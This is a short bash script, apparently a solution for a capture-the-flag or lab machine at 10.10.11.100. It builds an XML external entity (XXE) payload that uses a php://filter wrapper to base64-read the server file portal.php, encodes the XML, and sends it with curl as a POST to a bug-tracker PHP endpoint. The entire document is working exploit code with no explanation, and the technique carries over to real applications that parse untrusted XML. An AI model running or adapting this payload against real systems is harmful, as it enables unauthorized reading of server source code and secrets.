#!/bin/bash

HEADER=$'<?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?>'
REPORT=$'<bugreport><title>flag?</title><cwe>xxe</cwe><cvss>pwned</cvss><reward>&flag;</reward></bugreport>'
PAYLOAD=$'<!DOCTYPE foo [<!ENTITY flag SYSTEM \"php://filter/convert.base64-encode/resource=portal.php\"> ]>'
DATA=$(echo "${HEADER}${PAYLOAD}${REPORT}" | base64 -w 0)

curl -i -s -k -X $'POST' --compressed \
    -H $'Host: 10.10.11.100' \
    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
    -H $'Accept-Encoding: gzip, deflate' \
    --data-urlencode "data=${DATA}" \
    $'http://10.10.11.100/tracker_diRbPr00f314.php'
